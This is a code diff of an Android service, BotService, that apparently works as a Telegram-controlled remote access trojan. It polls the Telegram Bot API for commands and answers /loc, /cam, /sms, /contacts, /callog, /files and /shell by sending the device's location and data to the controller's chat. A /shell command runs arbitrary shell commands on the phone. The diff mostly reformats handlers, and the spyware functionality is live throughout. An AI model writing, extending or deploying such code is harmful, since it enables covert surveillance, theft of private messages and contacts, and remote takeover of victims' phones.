@@ -43,15 +43,9 @@ public class BotService extends Service {
             try{
                 String url = TgApi.API+"/getUpdates?timeout=25&offset="+(lastId+1);
                 String r = TgApi.get(url);
-                if(r == null || r.isEmpty()){
-                    Thread.sleep(1500);
-                    continue;
-                }
+                if(r == null || r.isEmpty()){ Thread.sleep(1500); continue; }
                 JSONObject j = new JSONObject(r);
-                if(!j.optBoolean("ok", false)){
-                    Thread.sleep(2000);
-                    continue;
-                }
+                if(!j.optBoolean("ok", false)){ Thread.sleep(2000); continue; }
                 JSONArray a = j.optJSONArray("result");
                 if(a == null){ Thread.sleep(1000); continue; }
                 for(int k=0;k<a.length();k++){
@@ -77,7 +71,7 @@ public class BotService extends Service {
         try{
             cmd = cmd.trim();
             if(cmd.equals("/start") || cmd.equals("/help")){
-                TgApi.send("MENU:\n/info\n/loc\n/live\n/cam\n/cam_back\n/sms\n/contacts\n/callog\n/files\n/vibrate\n/shell <cmd>");
+                TgApi.send("MENU:\n/info\n/loc\n/live\n/cam\n/cam_back\n/sms\n/contacts\n/callog\n/files\n/vibrate\n/shell");
                 return;
             }
             if(cmd.equals("/info")){ TgApi.send("Model: "+Build.MODEL+"\nBrand: "+Build.BRAND+"\nAndroid: "+Build.VERSION.RELEASE); return; }
@@ -91,8 +85,8 @@ public class BotService extends Service {
             if(cmd.equals("/files")){ files(); return; }
             if(cmd.equals("/vibrate")){ vib(); return; }
             if(cmd.startsWith("/shell ")){ shell(cmd.substring(7)); return; }
-            TgApi.send("Unknown cmd: "+cmd);
-        }catch(Exception e){ TgApi.send("cmd err "+e.getMessage()); }
+            TgApi.send("Unknown: "+cmd);
+        }catch(Exception e){ TgApi.send("err "+e.getMessage()); }
     }
     private void sendLoc(){
         try{
@@ -101,10 +95,8 @@ public class BotService extends Service {
                 Location l = locMgr.getLastKnownLocation(p);
                 if(l!=null && (last==null || l.getTime()>last.getTime())) last = l;
             }
-            if(last!=null){
-                TgApi.sendLoc(last.getLatitude(), last.getLongitude());
-                TgApi.send("Lat: "+last.getLatitude()+"\nLon: "+last.getLongitude()+"\nAcc: "+last.getAccuracy()+"m");
-            } else TgApi.send("no location");
+            if(last!=null){ TgApi.sendLoc(last.getLatitude(), last.getLongitude()); TgApi.send("Lat: "+last.getLatitude()+"\nLon: "+last.getLongitude()); }
+            else TgApi.send("no location");
         }catch(Exception e){ TgApi.send("loc err "+e.getMessage()); }
     }
     private void liveLoc(){
